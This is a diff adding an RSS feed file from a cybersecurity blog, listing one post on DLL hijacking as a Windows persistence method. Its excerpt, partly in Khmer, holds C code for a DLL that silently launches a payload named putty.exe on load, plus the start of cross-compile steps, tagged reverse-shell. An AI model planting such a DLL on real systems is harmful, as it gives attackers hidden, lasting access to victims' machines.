@@ -1,0 +1,67 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" 
+  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
+  xmlns:dc="http://purl.org/dc/elements/1.1/" 
+  xmlns:atom="http://www.w3.org/2005/Atom" 
+  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
+  xmlns:media="http://search.yahoo.com/mrss/">
+  <channel>
+    <title>persistence on ThikLab - CyberSec</title>
+    <link>https://thiklab.com/en/tags/persistence/</link>
+    <description>Recent content in persistence on ThikLab - CyberSec</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <managingEditor>thiklife403@gmail.com (Thik)</managingEditor>
+    <webMaster>thiklife403@gmail.com (Thik)</webMaster>
+    <copyright><a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'><img alt='Creative Commons License' style='border-width:0;display:block;margin-left:auto;margin-right:auto;' src='https://i.creativecommons.org/l/by-sa/4.0/88x31.png' /></a>©2020 - 2022 All content is licensed under <a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'>CC BY-SA</a>.</copyright>
+    <lastBuildDate>Tue, 06 Dec 2022 21:01:06 +0700</lastBuildDate>
+    
+        <atom:link href="https://thiklab.com/en/tags/persistence/index.xml" rel="self" type="application/rss+xml" />
+    
+
+      
+      <item>
+        <title>DLL Hijacking - Persistence Method</title>
+        <link>https://thiklab.com/en/posts/dll-hijacking-persistence-method/</link>
+        <pubDate>Tue, 06 Dec 2022 21:01:06 +0700</pubDate>
+        <author>thiklife403@gmail.com (Thik)</author>
+        <atom:modified>Tue, 06 Dec 2022 21:01:06 +0700</atom:modified>
+        <guid>https://thiklab.com/en/posts/dll-hijacking-persistence-method/</guid>
+        <description>C - Execute Command Prompt ចម្លងកូដ និង កែប្រែទីតាំងរបស់ Payload​ ។
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  #include &amp;lt;windows.h&amp;gt;using namespace std; void exec() { WinExec(&amp;#34;cmd.exe /c c:\\programdata\\putty.exe&amp;#34;, 0); } BOOL WINAPI DllMain (HANDLE hDLL, DWORD dwReason, LYVOID lpReserved) { switch (dwReason) { case DLL_PROCESS_ATTACH: exec(); break; } return TRUE; }  
+DLL Build ចូលទៅកាន់ផ្ទាំង Terminal ក្នុងប្រព័ន្ធប្រតិបត្តិការលីនុច រួចវាយពាក្យបញ្ជាដូខខាងក្រោម៖
+1 2 3 4 5 6 7 8  // To create Windows executables, you need to instsall mingw cross-compiler sudo apt-get install mingw-w64 //For x64 compile with: x86_64-w64-mingw32-gcc r4t.</description>
+        
+        <dc:creator>thik</dc:creator>
+        <media:content url="https://thiklab.comimages/feature2/article-1.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>dll</category>
+            
+          
+            
+              <category>reverse-shell</category>
+            
+          
+            
+              <category>persistence</category>
+            
+          
+        
+        
+        
+          
+            
+              <category>WinExE</category>
+            
+          
+        
+      </item>
+      
+
+    
+  </channel>
+</rss>
